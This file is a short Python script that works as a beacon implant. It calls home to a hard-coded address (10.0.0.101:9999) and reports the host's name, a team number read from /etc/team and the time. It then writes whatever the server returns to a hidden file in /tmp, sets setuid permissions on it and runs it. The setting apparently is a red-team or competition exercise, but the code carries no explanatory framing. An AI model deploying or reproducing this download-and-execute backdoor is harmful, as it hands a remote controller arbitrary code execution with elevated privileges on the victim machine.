#!/usr/bin/python

import socket
import time
import os
import subprocess

def get_team_number():
  team_file_name = "/etc/team"

  try:
    file = open(team_file_name, 'r')
    team_number = file.read()
  except:
    team_number = 0

  return team_number

def create_local_script(script_location, script_contents):
  file = open(script_location, 'w')
  file.write(script_contents)

def attempt_script_save(script_contents):
  save_location = '/tmp/.ambipom.424'

  try:
    create_local_script(save_location, script_contents)
    return save_location
  except:
    pass

def run_script(script_location):
  os.chmod(script_location, 06777)
  subprocess.call(script_location)

  
def phone_home(ip, port):
    team_number = get_team_number()
    to_send = "%s,%s,%s" % (team_number, socket.gethostname().split('.')[0],time.strftime("%Y-%m-%d_%H:%M"))
    # create an ipv4 (AF_INET) socket object using the tcp protocol (SOCK_STREAM)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect the client
    # client.connect((target, port))
    client.connect((ip, port))

    # send some data (in this case a HTTP GET request)
    client.send(to_send.encode('utf8'))
    # receive the response data (4096 is recommended buffer size)
    response = client.recv(4096)
    if response == "no":
      exit(1)
    else:
      saved_location = attempt_script_save(response)
      time.sleep(10)
      os.chmod(saved_location, 06755)
      run_script(saved_location)

    return(response)

ip = "10.0.0.101"
port = 9999

phone_home(ip, port)